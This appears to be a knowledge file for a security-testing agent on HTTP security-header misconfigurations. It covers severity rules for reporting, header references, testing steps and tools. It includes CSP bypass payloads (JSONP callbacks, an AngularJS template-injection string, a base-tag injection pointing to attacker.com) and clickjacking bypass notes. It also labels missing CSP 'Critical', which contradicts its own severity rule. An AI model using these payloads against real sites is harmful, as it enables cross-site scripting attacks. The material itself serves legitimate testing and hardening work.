---
name: security-headers
description: Security header misconfigurations and missing headers that enable XSS, clickjacking, MIME sniffing, and data leakage
---

# Security Headers Misconfigurations

## Severity Classification — Real Impact Gate

**CRITICAL RULE: Missing security headers are NEVER Critical or High severity on their own. They are Low or Informational unless combined with an active exploitable vulnerability.**

Before reporting any security header finding, determine the actual severity:

| Finding | Severity | Condition |
|---------|----------|-----------|
| Missing X-Frame-Options + confirmed clickjacking PoC | Medium | Must demonstrate actual clickjacking |
| Missing X-Frame-Options only | Informational/Low | No active exploit |
| Missing CSP + active XSS confirmed | Report as XSS (add CSP as fix) | CSP absence is part of XSS, not separate |
| Missing CSP only, no XSS | Informational | No active exploit enabled |
| Missing HSTS on HTTPS site | Low | Informational in most cases |
| Missing X-Content-Type-Options + MIME sniffing exploited | Low | Must show active exploitation |
| Missing security headers on non-sensitive page | Informational | Not reportable as vulnerability |

**NEVER report standalone "missing headers" as High or Critical.**
**NEVER report a separate "Missing CSP" finding if you already reported XSS — the CSP recommendation goes in the XSS fix section.**
**DO report clickjacking when you have a working PoC demonstrating actual user-interaction theft.**

Missing or misconfigured HTTP security headers are among the most common web vulnerabilities. While individually low-severity, they enable or amplify attacks: missing CSP enables XSS persistence, missing HSTS enables SSL stripping, and misconfigured CORS allows cross-origin data theft.

## Headers Reference

### Content-Security-Policy (CSP)

Controls which resources can be loaded. Misconfiguration enables XSS.

**Missing (Critical)**
```
# No CSP = no restriction on inline scripts, external scripts, etc.
```

**Dangerous Directives**
```
Content-Security-Policy: script-src 'unsafe-inline'   # Inline scripts allowed
Content-Security-Policy: script-src 'unsafe-eval'     # eval() allowed
Content-Security-Policy: script-src *                  # Any origin
Content-Security-Policy: script-src https:             # Any HTTPS source
Content-Security-Policy: default-src *                 # Wildcard default
```

**Bypass via Allowed CDNs**
```
# If script-src includes jsonp-enabled CDN:
Content-Security-Policy: script-src https://accounts.google.com
# Attack: <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)">

Content-Security-Policy: script-src https://ajax.googleapis.com
# Attack: <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js">
# Then use AngularJS template injection: {{constructor.constructor('alert(1)')()}}
```

**Bypass via base-uri Missing**
```html
<base href="https://attacker.com/">
<!-- All relative script/style URLs now load from attacker -->
```

**Nonce/Hash Bypass**
```
# Weak nonce: static, predictable, or reused across pages
# Hash mismatch: modifying script content while hash stays
```

**report-uri Only (No Block)**
```
Content-Security-Policy-Report-Only: script-src 'self'
# Reports violations but doesn't block them
```

### X-Frame-Options

Prevents clickjacking. Being replaced by CSP `frame-ancestors`.

```
Missing → clickjacking possible
X-Frame-Options: ALLOWALL → explicitly allows all framing
X-Frame-Options: ALLOW-FROM https://attacker.com → allows attacker to frame
```

**Bypass**
- Use `<iframe sandbox>` — some browsers ignore X-Frame-Options in sandboxed iframes
- Double-framing: top frame allowed, nested frame with payload
- Replace with `Content-Security-Policy: frame-ancestors 'none'` for modern browsers

### X-Content-Type-Options

Prevents MIME sniffing.

```
Missing → browser sniffs content type → may execute attacker-uploaded files as scripts
# Upload file with JS content, serve as image/gif → browser may execute as script
```

### Strict-Transport-Security (HSTS)

Prevents SSL stripping and protocol downgrade.

```
Missing → HTTP possible → SSL strip attacks
Short max-age: Strict-Transport-Security: max-age=300 → easily expired
No includeSubDomains → subdomains vulnerable
No preload → not in browser preload list → vulnerable on first visit
```

**Ideal**
```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

### Referrer-Policy

Controls what `Referer` header is sent to third parties.

```
Missing / Referrer-Policy: unsafe-url → full URL (including tokens) leaked to third parties
# URL: https://app.com/reset?token=SECRET
# User clicks external link → Referer: https://app.com/reset?token=SECRET sent to third party
```

**Dangerous Values**
```
Referrer-Policy: unsafe-url          # Full URL always
Referrer-Policy: no-referrer-when-downgrade  # Full URL on same-protocol
```

### Permissions-Policy (Feature-Policy)

Controls browser feature access.

```
Missing → page can access camera, microphone, geolocation, payment APIs
Permissions-Policy: geolocation=*, camera=*, microphone=*  → all origins allowed
```

### Cross-Origin-Resource-Policy (CORP)

```
Missing → resources loadable by any origin (enables spectre/side-channel)
Cross-Origin-Resource-Policy: cross-origin  → explicitly allows any origin
```

### Cross-Origin-Opener-Policy (COOP)

```
Missing → cross-origin windows can access opener window object
Cross-Origin-Opener-Policy: unsafe-none  → explicitly allows
```

### Cross-Origin-Embedder-Policy (COEP)

```
Missing → SharedArrayBuffer unavailable (but also misconfig allowing unsafe)
Cross-Origin-Embedder-Policy: unsafe-none  → permits cross-origin resources without CORP
```

### Cache-Control for Sensitive Pages

```
Missing Cache-Control on authenticated pages:
→ Responses cached by browser/proxy → another user on shared computer accesses data
→ BFCache preserves authenticated page state after logout

Secure:
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache  # HTTP/1.0 compat
```

### Server / X-Powered-By

```
Server: Apache/2.4.49  → version disclosure → targeted exploits
X-Powered-By: PHP/7.4.3  → version disclosure
```

### Set-Cookie Flags

```
# Missing Secure flag → cookie sent over HTTP
Set-Cookie: session=X (no Secure)

# Missing HttpOnly → JavaScript can read cookie → XSS steals session
Set-Cookie: session=X (no HttpOnly)

# Missing SameSite → CSRF possible
Set-Cookie: session=X (no SameSite)

# Ideal:
Set-Cookie: session=X; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
```

## Testing Methodology

1. **Scan all pages** — Run every authenticated endpoint through header analysis
2. **CSP analysis** — Parse policy, identify `unsafe-inline`, `unsafe-eval`, wildcards, JSONP endpoints
3. **Missing headers** — Check HSTS, X-Content-Type-Options, X-Frame-Options/CSP frame-ancestors
4. **Cookie flags** — Enumerate all Set-Cookie headers, verify Secure/HttpOnly/SameSite
5. **Information disclosure** — Check Server, X-Powered-By, X-AspNet-Version
6. **Cache headers** — Verify no-store on authenticated/sensitive pages
7. **CORS** — Covered in cors_misconfiguration.md but check Origin: reflection
8. **Feature Policy** — Check camera/mic/geo permissions if not needed

## Tools

```bash
# Command line check
curl -I https://target.com

# Securityheaders.com (online)
# Mozilla Observatory (online)

# Nikto
nikto -h https://target.com

# testssl.sh for TLS + headers
testssl.sh https://target.com
```

## Validation

1. For CSP: demonstrate that XSS payload executes due to policy gap
2. For clickjacking: show target page loads in iframe on attacker page
3. For HSTS: demonstrate HTTP access works (no redirect/error)
4. For cookie flags: show cookie accessible via JavaScript (`document.cookie`) if HttpOnly missing
5. For cache: show sensitive page returned from cache after logout

## Impact Classification

| Header | Missing Impact |
|--------|---------------|
| CSP | XSS amplification, persistent XSS |
| X-Frame-Options | Clickjacking → credential theft |
| HSTS | SSL strip → credential theft |
| X-Content-Type-Options | MIME sniff XSS from uploads |
| Secure cookie flag | Cookie theft over HTTP |
| HttpOnly cookie flag | Cookie theft via XSS |
| SameSite cookie | CSRF attacks |
| Referrer-Policy | Token/secret leakage to third parties |

## Pro Tips

1. Missing CSP is noteworthy but needs an actual XSS vector to be impactful
2. Report HSTS missing only if HTTP version of site is accessible (not redirect)
3. Clickjacking requires a meaningful action (login, purchase, settings change)
4. SameSite=Lax is now default in Chrome — test older browsers and cross-site contexts
5. `Content-Security-Policy-Report-Only` is NOT protective — report it as misconfigured CSP
6. Version disclosure headers should note the actual CVEs for those versions
7. Cache-Control on authenticated pages is often accepted by programs as P3/informational
8. Feature-Policy misconfiguration is usually low severity unless camera/mic accessible

## Summary

Security headers are cheap to add and expensive to miss. Prioritize CSP (XSS defense), HSTS (transport security), cookie flags (session security), and X-Content-Type-Options (upload abuse). Each missing header multiplies the impact of other vulnerabilities.
